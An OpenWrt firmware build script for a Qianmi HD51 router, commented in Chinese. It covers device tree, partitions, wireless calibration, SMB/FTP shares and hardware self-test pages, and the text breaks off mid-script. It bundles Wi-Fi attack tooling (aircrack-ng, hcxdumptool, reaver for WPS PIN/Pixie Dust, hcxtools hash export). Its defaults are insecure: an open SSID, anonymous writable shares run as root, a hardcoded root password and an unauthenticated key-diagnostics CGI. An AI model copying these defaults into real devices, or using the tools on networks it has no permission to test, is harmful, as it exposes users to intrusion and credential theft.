#!/bin/bash
# 百米 HD51 v5：修 2.4G 不广播（wmac 校准数据改正）+ 打开 SDHCI + 无线配置烘进镜像
# 百米 HD51 自检版：MT7620A + 128MB + 16MB(MX25L12835E) + 百兆 5 口 + USB + PCIe/5G 探测
# 复位键 GPIO13（原厂 /etc/init.d/boot:61 `btnd reset 13`）
# 依据原厂 16MB dump 实测分区：u-boot 0x0/0x30000, env 0x30000/0x10000,
# factory 0x40000/0x40000(0x200 校准), firmware 0x80000/0x6F0000, data 0x770000/0x890000
set -e

WS="${GITHUB_WORKSPACE:-$(cd .. && pwd)}"
if [ -d "target/linux/ramips" ]; then
	SRC="$(pwd)"
else
	SRC="$WS/openwrt"
fi
[ -d "$SRC/target/linux/ramips" ] || { echo "!! 找不到 ramips 源码树"; exit 1; }

# ---------- 0. SD 写卡超时修复（驱动层，失败则立即中止编译） ----------
SD_SRC="$SRC/target/linux/ramips/files/drivers/mmc/host/mtk-mmc/sd.c"
if [ ! -f "$SD_SRC" ]; then
	SD_SRC="$(find "$SRC/target/linux" -path '*mtk-mmc/sd.c' -print -quit)"
fi
[ -n "$SD_SRC" ] && [ -f "$SD_SRC" ] || { echo "!! 找不到 mtk-mmc/sd.c，中止"; exit 1; }
echo "SD_PATCH 目标: $SD_SRC"
sed -i 's|^#define CMD_TIMEOUT.*|#define CMD_TIMEOUT (HZ * 5)  /* HD51: 写卡后等 busy 5 秒 */|' "$SD_SRC"
sed -i 's|^#define DAT_TIMEOUT.*|#define DAT_TIMEOUT (HZ * 30) /* HD51: 数据传输等 30 秒 */|' "$SD_SRC"
grep -q "HZ \* 5" "$SD_SRC" || { echo "!! CMD_TIMEOUT 未生效，中止"; exit 1; }
grep -q "HZ \* 30" "$SD_SRC" || { echo "!! DAT_TIMEOUT 未生效，中止"; exit 1; }
grep -n "#define CMD_TIMEOUT\|#define DAT_TIMEOUT" "$SD_SRC" | head -4



# ---------- 1. DTS ----------
cat > "$SRC/target/linux/ramips/dts/mt7620a_qianmi_hd51.dts" << 'EOF'
// SPDX-License-Identifier: GPL-2.0-or-later OR MIT

#include "mt7620a.dtsi"

#include <dt-bindings/gpio/gpio.h>
#include <dt-bindings/input/input.h>
#include <dt-bindings/leds/common.h>

/ {
	compatible = "qianmi,hd51", "ralink,mt7620a-soc";
	model = "Qianmi HD51";

	aliases {
		label-mac-device = &ethernet;
	};

	keys {
		compatible = "gpio-keys";

		reset {
			label = "reset";
			gpios = <&gpio0 13 GPIO_ACTIVE_LOW>;
			linux,code = <KEY_RESTART>;
		};
	};
};

&spi0 {
	status = "okay";

	flash@0 {
		compatible = "jedec,spi-nor";
		reg = <0>;
		spi-max-frequency = <24000000>;
		m25p,fast-read;

		partitions {
			compatible = "fixed-partitions";
			#address-cells = <1>;
			#size-cells = <1>;

			partition@0 {
				label = "u-boot";
				reg = <0x0 0x30000>;
				read-only;
			};

			partition@30000 {
				label = "u-boot-env";
				reg = <0x30000 0x10000>;
				read-only;
			};

			factory: partition@40000 {
				label = "factory";
				reg = <0x40000 0x10000>;
				read-only;

				nvmem-layout {
					compatible = "fixed-layout";
					#address-cells = <1>;
					#size-cells = <1>;

					eeprom_factory_0: eeprom@0 {
						reg = <0x0 0x200>;
					};

					macaddr_factory_28: macaddr@28 {
						reg = <0x28 0x6>;
					};
				};
			};

			partition@50000 {
				compatible = "denx,uimage";
				label = "firmware";
				reg = <0x50000 0xfb0000>;
			};
		};
	};
};

&ehci {
	status = "okay";
};

&ohci {
	status = "okay";
};

&ethernet {
	nvmem-cells = <&macaddr_factory_28>;
	nvmem-cell-names = "mac-address";

	mediatek,portmap = "lllll";
};

&wmac {
	/* v9：校准走固件文件通道（已由 v7 实机验证：radio0 显示 MediaTek MT7620、
	   手机连上 192.168.1.242、Rx 104Mbit/s MCS13）。数据烘在
	   /lib/firmware/soc_wmac.eeprom，512 字节，取自原厂 factory 分区。 */
	/delete-property/ ralink,mtd-eeprom;
};

&sdhci {
	/* mt7620A 自带 SD 主机控制器（OpenWrt 有 830-mmc 补丁支持），
	   dtsi 里默认 disabled，这里打开 */
	status = "okay";
	/* v27：卡检测改软件轮询。依据：mtk_sd.ko 二进制里存在 "mediatek,cd-poll"
	   属性名；Kconfig 的 CONFIG_MTK_MMC_CD_POLL 改了但模块 md5 与 v25 完全一致
	   （实测未生效），真正开关是设备树属性 */
	mediatek,cd-poll;
};

&pcie {
	status = "okay";
};
EOF
echo "==> DTS 已写入"

# ---------- 1b. 补 root=：Breed 不传 root，写 flash 的系统必挂 ----------
# 实测 /proc/cmdline 只有 console=ttyS0,57600 rootfstype=squashfs,jffs2，没有 root=
# 内核里已确认带 bootargs-append 支持（OpenWrt 314-MIPS-add-bootargs-override-property.patch）
# mtdsplit(denx,uimage) 把 firmware 切成 kernel=mtd4、rootfs=mtd5，故 root 指向 mtdblock5
DTSI="$SRC/target/linux/ramips/dts/mt7620a.dtsi"
python3 - "$DTSI" << 'PY2'
import sys, re
p = sys.argv[1]
s = open(p).read()
if 'bootargs-append' in s:
    print('dtsi 已有 bootargs-append，跳过'); sys.exit(0)
s2 = s.replace(
    'bootargs = "console=ttyS0,57600";',
    'bootargs = "console=ttyS0,57600";\n\t\tbootargs-append = " root=/dev/mtdblock5 rootfstype=squashfs,jffs2 rootwait";', 1)
if s2 == s:
    print('!! 未匹配到 bootargs 行，bootargs-append 未加'); sys.exit(1)
open(p, 'w').write(s2)
print('dtsi 已加 bootargs-append -> root=/dev/mtdblock5')
PY2

# ---------- 2. 设备定义 ----------
GMK="$SRC/target/linux/ramips/image/mt7620.mk"
if grep -q "^define Device/qianmi_hd51$" "$GMK"; then
	sed -i '/^define Device\/qianmi_hd51$/,/^TARGET_DEVICES += qianmi_hd51$/d' "$GMK"
fi
cat >> "$GMK" << 'EOF'

define Device/qianmi_hd51
  SOC := mt7620a
  IMAGE_SIZE := 16320k
  DEVICE_VENDOR := Qianmi
  DEVICE_MODEL := HD51
  DEVICE_DTS := mt7620a_qianmi_hd51
  DEVICE_PACKAGES := kmod-rt2800-soc kmod-mt76x0e kmod-mt76x2 kmod-usb2 kmod-usb-ohci \
	kmod-usb-storage kmod-fs-exfat kmod-fs-vfat
  SUPPORTED_DEVICES += qianmi,hd51 hd51
endef
TARGET_DEVICES += qianmi_hd51
EOF
echo "==> 设备定义已写入"

# ---------- 3. 交换机：5 口全 LAN（AP/中继形态） ----------
NET="$SRC/target/linux/ramips/mt7620/base-files/etc/board.d/02_network"
[ -f "$NET" ] || { echo "!! 找不到 02_network"; exit 1; }
python3 - "$NET" << 'PY'
import sys
p = sys.argv[1]
s = open(p).read()
if 'qianmi,hd51' in s:
    print('已有 hd51 分支，跳过')
    sys.exit(0)
anchor = "\tasus,rp-n53)\n"
block = (
    "\tqianmi,hd51)\n"
    "\t\tucidef_add_switch \"switch0\" \\\n"
    "\t\t\t\"0:lan\" \"1:lan\" \"2:lan\" \"3:lan\" \"4:lan\" \"6@eth0\"\n"
    "\t\t;;\n"
)
if anchor not in s:
    print('!! 找不到插入锚点'); sys.exit(1)
s = s.replace(anchor, block + anchor, 1)
open(p, 'w').write(s)
print('02_network 已插入 hd51 分支')
PY

# ---------- 4. 默认配置：中文 / 时区 / 开放热点 ----------
mkdir -p "$SRC/files/etc/uci-defaults" "$SRC/files/etc/config"
cat > "$SRC/files/etc/config/network" << 'NETEOF'
config interface 'loopback'
	option device 'lo'
	option proto 'static'
	option ipaddr '127.0.0.1'
	option netmask '255.255.255.0'

config device 'brlan'
	option name 'br-lan'
	option type 'bridge'
	list ports 'eth0'
	list ports 'eth0.1'

config switch
	option name 'switch0'
	option reset '1'
	option enable_vlan '1'

config switch_vlan
	option device 'switch0'
	option vlan '1'
	option ports '0 1 2 3 4 6t'

config interface 'lan'
	option device 'br-lan'
	option proto 'static'
	option ipaddr '192.168.1.1'
	option netmask '255.255.255.0'
	option ip6assign '60'
NETEOF

# v5：无线配置直接烘进镜像，不再依赖首次开机时 `wifi config` 是否能探到 phy。
# 这样即使 phy 命名的先后顺序不同，hostapd 也有确定的配置可用。
cat > "$SRC/files/etc/config/wireless" << 'WIFIEOF'
config wifi-device 'radio0'
	option type 'mac80211'
	option channel '1'
	option band '2g'
	option htmode 'HT20'
	option country 'CN'
	option disabled '0'
	option path 'platform/10180000.wmac'

config wifi-iface 'default_radio0'
	option device 'radio0'
	option network 'lan'
	option mode 'ap'
	option ssid 'HD51'
	option encryption 'none'
	option disabled '0'
WIFIEOF

# v7：把原厂 factory 分区里的无线校准数据烘进镜像（/lib/firmware/soc_wmac.eeprom）
# 数据来源：原厂 dump 百米生活.bin @0x40000 起 0x200 字节
#   WLAN MAC 8c:88:4b:00:53:8a（= 本机 phy0-ap0 实测 addr），ETH MAC 8c:88:4b:00:53:88
#   md5(512字节) = 6b409897e68203b323fd0bbe25aefe74
mkdir -p "$SRC/files/lib/firmware" "$SRC/files/etc"
cat > "$SRC/files/lib/firmware/soc_wmac.eeprom.b64" << 'CALEOF'
IHYFAYyISwBTiv///////////////////////////////////////4yISwBTiIyISwBTiSIMBMD/
/x4BVXeoqoyI//8KAAAAAAAAAAAA/////xAQDw8ODg4ODw8PDw8PExMTEhISEhMTFBQUFBSA////
gP///wAA////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////yD/////////////////CAgICAQA
BwcEAAgIBAAHBwQA////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////8=
CALEOF
base64 -d "$SRC/files/lib/firmware/soc_wmac.eeprom.b64" > "$SRC/files/lib/firmware/soc_wmac.eeprom"
rm -f "$SRC/files/lib/firmware/soc_wmac.eeprom.b64"
echo "烘入校准文件 $(wc -c < "$SRC/files/lib/firmware/soc_wmac.eeprom") 字节"

# 版本标记：浏览器打开 http://192.168.1.1/ver.txt 就能确认烧进去的是哪一版
mkdir -p "$SRC/files/www"
cat > "$SRC/files/www/ver.txt" << 'VEREOF'
HD51 v36
build: 2026-11-21
dts: /delete-property/ ralink,eeprom + ralink,mtd-eeprom = <&factory 0x0>
wireless: baked (/etc/config/wireless, radio0, SSID HD51, open)
sd: &sdhci status=okay
VEREOF

# ===== v28：摘掉 v24 的 dropbearkey 桩 =====
# v27 实测：桩让 hk_verify 通过、dropbear 被喂了镜像里的密钥，但进程直接退出（22 端口 refused）
# => 镜像里那两把密钥 dropbear 认不了。桩这条路作废，改用"现场自检 + 修根因"
# 新增 /cgi-bin/dbk 自检页，刷完打开一次就能看到 dropbear 拒绝密钥的真实报错

# ===== v26：7612 ZeroCD 规则与钥匙 =====
mkdir -p "$SRC/files/usr/share/usb_modeswitch" "$SRC/files/etc/usb_modeswitch.d" "$SRC/files/root"
cat > "$SRC/files/usr/share/usb_modeswitch/0e8d:2870" << 'MSR'
TargetVendor=0e8d
TargetProduct=7612
StandardEject=1
MSR
cp -f "$SRC/files/usr/share/usb_modeswitch/0e8d:2870" "$SRC/files/etc/usb_modeswitch.d/0e8d:2870" 2>/dev/null || true

cat > "$SRC/files/root/modesw.sh" << 'MSKEY'
#!/bin/sh
# 钥匙：把 ZeroCD 状态的 MT7612U 弹成 WiFi 模式（0e8d:2870 -> 0e8d:7612）
v() { cat /sys/bus/usb/devices/1-1/idVendor 2>/dev/null; }
p() { cat /sys/bus/usb/devices/1-1/idProduct 2>/dev/null; }
echo "== 当前身份: $(v):$(p) =="
[ "$(v)" = "0e8d" ] && [ "$(p)" = "7612" ] && { echo "已经是 WiFi 模式，直接建监听口"; sh /root/dual-radio.sh; exit 0; }
[ "$(v)" = "0e8d" ] && [ "$(p)" = "2870" ] || { echo "没看到 0e8d:2870，也没有 7612，插好了再跑"; exit 1; }
echo "==> 弹 ZeroCD（多法逐条试，谁成用谁）"
/sbin/usbmode -s && echo "   [方式1] usbmode -s 已执行"
sleep 3
if [ "$(p)" != "7612" ]; then /etc/init.d/usbmode start && echo "   [方式2] init.d/usbmode start 已执行"; sleep 3; fi
if [ "$(p)" != "7612" ]; then /sbin/usbmode -s -c /etc/usb-mode.json && echo "   [方式3] 指定 json 已执行"; sleep 3; fi
echo "== 弹出后身份: $(v):$(p) =="
if [ "$(p)" = "7612" ]; then
	echo "==> 成功，等 mt76x2u 绑定"
	sleep 3
	iw dev | sed 's/^/  /'
	sh /root/dual-radio.sh
else
	echo "!! 没弹成。请把上面回显整段发我（含 usb-modeswitch 自己的报错）"
fi
MSKEY
chmod 755 "$SRC/files/root/modesw.sh"

# ===== v29：手机管理存储（SMB + FTP）=====
# 注意：ksmbd 的 init 会按 UCI(/etc/config/ksmbd) 重新生成 /var/etc/ksmbd/ksmbd.conf，
#       手写 /etc/ksmbd/ksmbd.conf 会被判为"自定义文件"而忽略 UCI，故这里只写 UCI
mkdir -p "$SRC/files/etc/config" "$SRC/files/etc" "$SRC/files/etc/init.d" "$SRC/files/root"

cat > "$SRC/files/etc/config/ksmbd" << 'KSMBC'
config globals
	option workgroup 'WORKGROUP'
	option description 'HD51'
	option interface 'lan'
	option allow_legacy_protocols '1'

config share
	option name 'HD51-DATA'
	option path '/data'
	option read_only 'no'
	option guest_ok 'yes'
	option create_mask '0666'
	option dir_mask '0777'
	option force_root '1'

config share
	option name 'HD51-USB'
	option path '/mnt/sda1'
	option read_only 'no'
	option guest_ok 'yes'
	option create_mask '0666'
	option dir_mask '0777'
	option force_root '1'
KSMBC

cat > "$SRC/files/etc/vsftpd.conf" << 'FTPC'
background=YES
listen=YES
listen_port=2121
anonymous_enable=YES
anon_root=/data
no_anon_password=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
local_enable=NO
pasv_enable=YES
pasv_min_port=50000
pasv_max_port=50100
seccomp_sandbox=NO
FTPC

# 每次开机先建好共享目录（initramfs 模式不持久化，必须每boot都建）
cat > "$SRC/files/etc/init.d/datadir" << 'DINIT'
#!/bin/sh /etc/rc.common
START=97
boot() {
	mkdir -p /data /mnt/sda1
	chmod 777 /data 2>/dev/null
}
DINIT
chmod 755 "$SRC/files/etc/init.d/datadir"

# 7612 ZeroCD 开机重试
cat > "$SRC/files/etc/init.d/umretry" << 'UMR'
#!/bin/sh /etc/rc.common
START=99
boot() {
	(
	i=0
	while [ $i -lt 12 ]; do
		pid=$(cat /sys/bus/usb/devices/1-1/idProduct 2>/dev/null)
		if [ -z "$pid" ]; then sleep 5; i=$((i+1)); continue; fi
		[ "$pid" = "2870" ] || break
		/sbin/usbmode -s >/dev/null 2>&1
		sleep 5
		i=$((i+1))
	done
	echo "umretry end idProduct=$(cat /sys/bus/usb/devices/1-1/idProduct 2>/dev/null)" >> /www/umretry.log
	) &
}
UMR
chmod 755 "$SRC/files/etc/init.d/umretry"

cat > "$SRC/files/root/share.sh" << 'SHKEY'
#!/bin/sh
mkdir -p /data /mnt/sda1 2>/dev/null
chmod 777 /data 2>/dev/null
case "$1" in
	off)
		/etc/init.d/ksmbd stop 2>/dev/null
		/etc/init.d/vsftpd stop 2>/dev/null
		echo "共享已停"
		exit 0 ;;
esac
/etc/init.d/ksmbd restart 2>/dev/null
/etc/init.d/vsftpd restart 2>/dev/null
IP=$(uci -q get network.lan.ipaddr 2>/dev/null)
[ -n "$IP" ] || IP=192.168.1.1
echo "===== 共享已开 ====="
echo "SMB  地址: $IP    共享名: HD51-DATA  (根目录 /data, 在 SD 上)"
echo "SMB  地址: $IP    共享名: HD51-USB   (根目录 /mnt/sda1, U 盘)"
echo "FTP  地址: ftp://$IP:2121   (匿名, 根目录 /data)"
echo "===== 挂载情况 ====="
df -h /data /mnt/sda1 2>/dev/null
echo "===== SMB 会话 ====="
cat /proc/fs/ksmbd/sessions 2>/dev/null | head -5
echo "===== 服务进程 ====="
ps 2>/dev/null | grep -E 'ksmbd|vsftpd' | grep -v grep
echo "===== 最近报错 ====="
logread 2>/dev/null | grep -iE 'ksmbd|vsftpd' | tail -5
SHKEY
chmod 755 "$SRC/files/root/share.sh"

cat > "$SRC/files/etc/uci-defaults/99-hd51-basic" << 'EOF'
#!/bin/sh
uci -q set system.@system[0].hostname='HD51-v16' || true
uci -q set system.@system[0].timezone='CST-8' || true
uci -q set system.@system[0].zonename='Asia/Shanghai' || true
uci -q commit system

# v29：共享目录 + U 盘匿名挂载 + 服务自启
mkdir -p /data /mnt/sda1
chmod 777 /data 2>/dev/null
if [ ! -f /etc/config/fstab ]; then
	printf 'config global\n\toption anon_mount 1\n' > /etc/config/fstab
elif ! grep -q 'config global' /etc/config/fstab; then
	printf '\nconfig global\n\toption anon_mount 1\n' >> /etc/config/fstab
else
	uci -q set fstab.@global[0].anon_mount='1'
	uci -q commit fstab
fi
# FTP 匿名映射用户 ftp 必须存在，否则 vsftpd 拒绝启动
grep -q '^ftp:' /etc/passwd 2>/dev/null || echo 'ftp:x:21:21:ftp:/var:/bin/false' >> /etc/passwd
mkdir -p /var/run/vsftpd
/etc/init.d/datadir enable 2>/dev/null || true
/etc/init.d/ksmbd enable 2>/dev/null || true
/etc/init.d/vsftpd enable 2>/dev/null || true
/etc/init.d/umretry enable 2>/dev/null || true

# 兜底：万一 phy 不在 radio0 上，按探测结果补一次
[ -f /etc/config/wireless ] || wifi config >/dev/null 2>&1
if [ -f /etc/config/wireless ]; then
	for i in 0 1 2 3; do
		uci -q set wireless.@wifi-iface[$i].ssid="HD51" || true
		uci -q set wireless.@wifi-iface[$i].encryption='none' || true
		uci -q set wireless.@wifi-iface[$i].network='lan' || true
		uci -q set wireless.@wifi-iface[$i].disabled='0' || true
		uci -q set wireless.@wifi-iface[$i].mode='ap' || true
	done
	uci -q set wireless.radio0.disabled='0' || true
	uci -q set wireless.radio0.country='CN' || true
	# 不再对 radio1 做任何 uci set（对不存在的命名段 set 会凭空造出重复 radio）
	# 收尾：删掉自动探测多出来的重复 wifi-device，只保留 radio0
	for s in $(uci -q show wireless | sed -n 's/^wireless\.\(radio[0-9]*\)=wifi-device$/\1/p'); do
		[ "$s" = "radio0" ] && continue
		uci -q delete wireless.$s || true
		uci -q delete wireless.default_$s || true
	done
	uci -q commit wireless
fi

# 兜底登录通道：SSH 密码 hd51（网页/串口都连不上时的最后手段）
printf 'hd51\nhd51\n' | passwd root >/dev/null 2>&1 || true
exit 0
EOF
chmod +x "$SRC/files/etc/uci-defaults/99-hd51-basic"

# ---------- 5. .config 里补包 ----------
CFG="$WS/${CONFIG_FILE:-.config.hd51}"
add_cfg() { grep -q "^$1=y" "$CFG" 2>/dev/null || echo "$1=y" >> "$CFG"; }
add_cfg CONFIG_PACKAGE_luci
add_cfg CONFIG_PACKAGE_luci-base
add_cfg CONFIG_PACKAGE_luci-i18n-base-zh-cn
add_cfg CONFIG_PACKAGE_wpad-basic-mbedtls
add_cfg CONFIG_PACKAGE_iw
add_cfg CONFIG_PACKAGE_iperf3
add_cfg CONFIG_PACKAGE_luci-app-commands
add_cfg CONFIG_PACKAGE_kmod-mt7620
add_cfg CONFIG_PACKAGE_kmod-mt76x0e
add_cfg CONFIG_PACKAGE_kmod-mt76x2
add_cfg CONFIG_PACKAGE_kmod-usb2
add_cfg CONFIG_PACKAGE_kmod-usb-ohci
add_cfg CONFIG_PACKAGE_kmod-gpio-button-hotplug
add_cfg CONFIG_PACKAGE_kmod-usb-storage
add_cfg CONFIG_PACKAGE_kmod-fs-exfat
add_cfg CONFIG_PACKAGE_urngd
# v25：SD 卡槽驱动恢复（两行与 v22 完全一致；v22 那次"起不来"已查明是 5 分钟慢启动，不是 SD 的锅）
# DTS 里 &sdhci status=okay 早已在位，驱动装上即可识卡
add_cfg CONFIG_PACKAGE_kmod-sdhci-mt7620
add_cfg CONFIG_PACKAGE_kmod-mmc
# v26：MT7612U 的 ZeroCD 弹出（0e8d:2870 假光驱 -> 0e8d:7612 WiFi）
add_cfg CONFIG_PACKAGE_usb-modeswitch
add_cfg CONFIG_PACKAGE_usb-modeswitch-data
# v29：手机管理 SD/USB —— SMB（ksmbd，内核级，轻） + FTP（vsftpd，备选）
add_cfg CONFIG_PACKAGE_ksmbd-server
add_cfg CONFIG_PACKAGE_vsftpd
# v31：审计三件套里的两套内核/用户态工具（源已核实存在 openwrt-23.05 分支）
add_cfg CONFIG_PACKAGE_aircrack-ng
add_cfg CONFIG_PACKAGE_hcxdumptool
# v34：种子下载（transmission + 网页端），下载目录落在 SD 的 /overlay
add_cfg CONFIG_PACKAGE_transmission-daemon
add_cfg CONFIG_PACKAGE_transmission-web

# v35：WPS 全套（仙尘/PixieDust、PBC、PIN）+ 22000 导出（hcxtools）
# reaver 不在 ImmortalWrt 官方 feed（23.05 SNAPSHOT 的 mipsel_24kc 里查不到），改为构建时直接拉取 openwrt/packages 的 net/reaver 包
mkdir -p "$SRC/package/reaver"
curl -fsSL -o "$SRC/package/reaver/Makefile" https://raw.githubusercontent.com/openwrt/packages/openwrt-23.05/net/reaver/Makefile
grep -q "PKG_NAME:=reaver" "$SRC/package/reaver/Makefile" || { echo "!! reaver Makefile 拉取失败"; exit 1; }
echo "==> [v35] reaver 包已放入 package/reaver"
add_cfg CONFIG_PACKAGE_reaver
add_cfg CONFIG_PACKAGE_hcxtools
# v36：把 Python3 栈搬进固件（wifit3 的用户态驱动需要它），并把 SD 链接钩子烘死
add_cfg CONFIG_PACKAGE_python3-light
add_cfg CONFIG_PACKAGE_python3-ctypes
add_cfg CONFIG_PACKAGE_libffi
add_cfg CONFIG_PACKAGE_libusb-1.0

# v26：TF 卡槽卡检测改软件轮询（HD51 的 CD 脚很可能未接入 SoC，CD_POLL=n 时永远认为无卡）
MK="$SRC/target/linux/ramips/modules.mk"
if grep -q "CONFIG_MTK_MMC_CD_POLL=n" "$MK" 2>/dev/null; then
	sed -i 's/CONFIG_MTK_MMC_CD_POLL=n/CONFIG_MTK_MMC_CD_POLL=y/' "$MK"
	echo "==> [v26] CD_POLL 已由 n 改为 y"
else
	echo "!! [v26] modules.mk 里没找到 CONFIG_MTK_MMC_CD_POLL=n，需人工确认"
fi
grep -n "CONFIG_MTK_MMC_CD_POLL" "$MK" || true
# v21：USB 无线网卡三件——RT3070 / AR9271 / MT7612U
add_cfg CONFIG_PACKAGE_kmod-rt2800-usb
add_cfg CONFIG_PACKAGE_kmod-ath9k-htc
add_cfg CONFIG_PACKAGE_kmod-mt76x2u
# 固件 blob（包名逐版本有差异，多写几个不会有害，缺的会被忽略）
add_cfg CONFIG_PACKAGE_rt2800-usb-firmware
add_cfg CONFIG_PACKAGE_ath9k-htc-firmware
add_cfg CONFIG_PACKAGE_mt76x2u-firmware
add_cfg CONFIG_PACKAGE_mt76-firmware
add_cfg CONFIG_PACKAGE_linux-firmware
# v21：NTFS
add_cfg CONFIG_PACKAGE_kmod-fs-ntfs3
# v22：SD 当 overlay / 大文件仓库所需
add_cfg CONFIG_PACKAGE_kmod-fs-ext4
add_cfg CONFIG_PACKAGE_kmod-fs-f2fs
add_cfg CONFIG_PACKAGE_e2fsprogs
add_cfg CONFIG_PACKAGE_f2fs-tools
add_cfg CONFIG_PACKAGE_block-mount
add_cfg CONFIG_PACKAGE_swap-utils
add_cfg CONFIG_PACKAGE_blkid
# v22：USB 外设利用——4G/网卡共享、串口
add_cfg CONFIG_PACKAGE_kmod-usb-net
add_cfg CONFIG_PACKAGE_kmod-usb-net-cdc-ether
add_cfg CONFIG_PACKAGE_kmod-usb-net-cdc-ncm
add_cfg CONFIG_PACKAGE_kmod-usb-net-rndis
add_cfg CONFIG_PACKAGE_kmod-usb-serial
add_cfg CONFIG_PACKAGE_kmod-usb-serial-option
add_cfg CONFIG_PACKAGE_kmod-usb-serial-pl2303
add_cfg CONFIG_PACKAGE_kmod-usb-serial-ch341
add_cfg CONFIG_DEVMEM
add_cfg CONFIG_BUSYBOX_CONFIG_DEVMEM
echo "==> .config 已补包（$CFG）"

# ---------- 6. 硬件自检：开机自动生成 /www/probe.html ----------
PROBE="$SRC/files/usr/bin/hd51-probe.sh"
mkdir -p "$SRC/files/usr/bin" "$SRC/files/www/cgi-bin" "$SRC/files/etc/init.d"

cat > "$SRC/files/www/cgi-bin/dbk" << 'DBKCGI'
#!/bin/sh
echo "Content-Type: text/plain; charset=utf-8"
echo ""
echo "===== /etc/dropbear 里的密钥 ====="
ls -l /etc/dropbear/ 2>&1
echo "===== 各文件字节数 ====="
wc -c /etc/dropbear/* 2>/dev/null
echo "===== 用 rsa 密钥前台试启 dropbear（5 秒后自动杀掉，端口 2222）====="
timeout 5 /usr/sbin/dropbear -F -E -r /etc/dropbear/dropbear_rsa_host_key -p 2222 2>&1 | head -20
echo "===== 用 ed25519 密钥前台试启 ====="
timeout 5 /usr/sbin/dropbear -F -E -r /etc/dropbear/dropbear_ed25519_host_key -p 2223 2>&1 | head -20
echo "===== 不带 -r 直接起（让它自己生成，5 秒）====="
timeout 5 /usr/sbin/dropbear -F -E -p 2224 2>&1 | head -10
echo "===== logread 里 dropbear 的报错 ====="
logread 2>/dev/null | grep -i dropbear | tail -20
DBKCGI
chmod 755 "$SRC/files/www/cgi-bin/dbk"

cat > "$PROBE" << 'PROBE_EOF'
#!/bin/sh
# HD51 自检探测：结果写到 /www/probe.html（手机浏览器直接看）
T=/tmp/probe.raw
: > "$T"
sec() { printf '\n===== %s =====\n' "$1" >> "$T"; }
run() { printf '\n$ %s\n' "$*" >> "$T"; ( "$@" ) >> "$T" 2>&1 || echo "[失败]" >> "$T"; }
hx() {
	if command -v hexdump >/dev/null 2>&1; then
		dd if="$1" bs=1 count="${2:-64}" 2>/dev/null | hexdump -C >> "$T"
	else
		dd if="$1" bs=1 count="${2:-64}" 2>/dev/null | od -An -tx1 >> "$T" 2>/dev/null
	fi
}

sec "0 基本信息"
run date
run uname -a
run cat /etc/openwrt_release
run cat /proc/cmdline

sec "1 CPU 与内存"
run sh -c "head -n 60 /proc/cpuinfo"
run free
run sh -c "head -n 12 /proc/meminfo"

sec "2 闪存与分区表"
run cat /proc/mtd
run sh -c "dmesg | grep -iE 'spi-nor|jedec|mx25|m25p|nand|mtd[0-9]' | head -n 40"

sec "3 引导器取证（Breed / u-boot）"
printf '\n--- /dev/mtd0 前 64 字节 ---\n' >> "$T"
hx /dev/mtd0 64
run sh -c "dd if=/dev/mtd0 bs=1024 count=192 2>/dev/null | tr -c '[:print:]' '\n' | grep -iE 'Breed|breed|r1[0-9][0-9][0-9]|mt7620|layout|offset|u-boot|U-Boot' | head -n 25"

sec "4 u-boot-env / mtd1"
hx /dev/mtd1 64
run sh -c "dd if=/dev/mtd1 bs=1024 count=64 2>/dev/null | tr -c '[:print:]' '\n' | grep -iE 'bootcmd|bootdelay|ipaddr|serverip|ip=|CurrentImage|Image1Try|RestFlag|baud|layout' | head -n 30"

sec "5 PCI 总线（5G 芯片关键）"
run lspci
run lspci -nn
run sh -c "for d in /sys/bus/pci/devices/*; do v=\$(cat \$d/vendor 2>/dev/null); p=\$(cat \$d/device 2>/dev/null); drv=\$(basename \$(readlink \$d/driver 2>/dev/null) 2>/dev/null); echo \"\$d vendor=\$v device=\$p driver=\$drv\"; done"
run sh -c "ls /sys/bus/pci/drivers 2>/dev/null"

sec "6 无线子系统"
run iw dev
run sh -c "ls -l /sys/class/ieee80211 2>/dev/null; for p in /sys/class/ieee80211/*; do echo \"== \$p\"; readlink \$p/device 2>/dev/null; done"
run sh -c "dmesg | grep -iE 'mt76|mt7610|mt7612|rt2x00|phy[0-9]|eeprom|calib|ieee80211' | head -n 40"
run uci show wireless

sec "7 交换机"
run sh -c "swconfig dev switch0 show 2>/dev/null | head -n 60"

sec "8 GPIO / 按键 / LED"
run sh -c "mount -t debugfs none /sys/kernel/debug 2>/dev/null; head -n 60 /sys/kernel/debug/gpio 2>/dev/null || echo 'debugfs gpio 不可读'"
run sh -c "ls /sys/class/leds 2>/dev/null; for l in /sys/class/leds/*; do echo \"== \$l\"; head -n 1 \$l/trigger 2>/dev/null; done"
run sh -c "ls /proc/device-tree 2>/dev/null | head -n 40"
run sh -c "cat /proc/device-tree/keys/reset/label 2>/dev/null; echo"

sec "9 SD / USB"
run sh -c "dmesg | grep -iE 'mmc|sdhci|usb-storage|scsi|uas' | head -n 40"
run sh -c "ls -l /dev/sd* /dev/mmcblk* /dev/disk/by-id 2>/dev/null"

sec "10 网络"
run sh -c "ifconfig -a"
run sh -c "ip addr show"

sec "11 dmesg 尾部"
run sh -c "dmesg | tail -n 80"

# 生成网页
{
	printf '%s\n' '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HD51 自检</title><style>body{margin:0;padding:10px;background:#0f1216;color:#dfe7ef;font:13px/1.5 monospace}h1{color:#6ad}h2{color:#fc6}p{color:#9ab}pre{white-space:pre-wrap;word-break:break-all;background:#151a20;padding:10px;border-radius:6px}</style></head><body>'
	printf '%s\n' '<h1>HD51 硬件自检</h1><p>把本页整页截图发回即可；GPIO 点灯：/cgi-bin/gpio?n=13&amp;v=1</p><pre>'
	sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g' "$T"
	printf '%s\n' '</pre></body></html>'
} > /www/probe.html
cp "$T" /www/probe.txt
echo "probe 完成 $(date)"
PROBE_EOF
chmod +x "$PROBE"

cat > "$SRC/files/etc/init.d/hd51probe" << 'INIT_EOF'
#!/bin/sh /etc/rc.common
START=99
start() { ( sleep 25; /usr/bin/hd51-probe.sh ) >/dev/null 2>&1 & }
boot() { start; }
INIT_EOF
chmod +x "$SRC/files/etc/init.d/hd51probe"

cat > "$SRC/files/www/cgi-bin/gpio" << 'CGI_EOF'
#!/bin/sh
printf 'Content-Type: text/plain; charset=utf-8\n\n'
N=""; V=""
for kv in $(echo "$QUERY_STRING" | tr '&' ' '); do
